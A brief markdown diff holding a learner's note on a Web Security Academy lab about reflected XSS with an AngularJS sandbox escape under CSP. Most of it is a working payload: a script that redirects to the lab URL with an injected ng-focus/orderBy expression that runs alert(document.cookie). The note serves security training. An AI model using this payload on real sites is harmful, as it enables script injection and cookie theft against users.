@@ -1,0 +1,9 @@
+Reflected XSS with AngularJS sandbox escape and CSP
+
+An incredible payload that's very well explained in the solution provided. 
+
+Here's my payload just in case:
+
+<script>
+location='https://ac101f1f1fcd71e980bd2a97005500a1.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+</script> 
